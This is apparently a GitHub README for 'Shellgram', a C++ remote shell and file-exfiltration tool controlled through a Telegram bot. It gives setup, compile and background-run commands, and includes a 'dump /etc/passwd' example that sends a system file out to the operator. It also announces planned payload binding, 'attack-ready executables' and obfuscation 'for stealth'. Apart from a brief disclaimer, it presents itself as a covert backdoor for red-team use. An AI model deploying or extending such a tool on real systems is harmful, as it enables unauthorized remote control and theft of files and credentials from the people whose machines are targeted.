# 📂 Shellgram

> **Remote Telegram Shell & File Uploader Bot (C++)**

**Shellgram** is a lightweight C++ tool that allows remote shell command execution and file uploading through a Telegram bot. This tool is designed for ethical hackers and red-teamers who want to interact with target systems remotely using Telegram.

---

## 🚀 Features

* 📡 Execute remote shell commands via Telegram
* 📁 Upload any file using `dump <filename>` command
* 📩 Get command output instantly in Telegram
* 🔐 Works through Telegram Bot API (no port forwarding needed)
* 🧱 Lightweight and fast (C++ with libcurl)

---

## 🛠️ Requirements

* C++ compiler (e.g. `g++`)
* [libcurl](https://curl.se/libcurl/)
* Telegram Bot Token & Chat ID

---

## ⚙️ Manual Setup & Compilation

1. 🔧 **Edit Configuration:** Replace the placeholders in the source code:

   ```cpp
   const string BOT_TOKEN = "YOUR BOT TOKEN";
   const string CHAT_ID = "YOUR CHAT ID";
   ```

2. 🛠️ **Compile the Tool:**

   ```bash
   g++ -o shellgram shellgram.cpp -lcurl
   ```

3. 🚀 **Run the Tool:**

   ```bash
   ./shellgram
   ```

---

## 💣 Usage (via Telegram)

| Command              | Action                             |
| -------------------- | ---------------------------------- |
| `ls`, `whoami`, etc. | Executes shell command remotely    |
| `dump filename`      | Uploads specified file to Telegram |

> ✅ Example:
>
> ```
> dump /etc/passwd
> ```

---

## 🔐 Disclaimer

> ⚠️ This tool is for **educational and authorized penetration testing** purposes only. Do not use it on any system without proper permission.

---

## 📦 Automation (Coming Soon...)

Currently, Shellgram needs to be compiled and configured manually. In future updates, a setup script will be added that can:

* 🔧 Automatically set bot token & chat ID
* ⚙️ Auto compile and bind Shellgram with a payload
* 🛆 Generate attack-ready executables
* 🔒 Obfuscate the final binary for stealth
* 🖥️ Compile based on target system architecture (x86_64, arm, etc.)

Stay tuned!

---

## 👨‍💻 Author

**Anon-404**
GitHub: [@Anon-404](https://github.com/Anon-404)

---

### 🧠 Pro Tip:

Run the tool in background using:

```bash
nohup ./shellgram &
```

This keeps the Telegram shell alive even after closing the terminal.
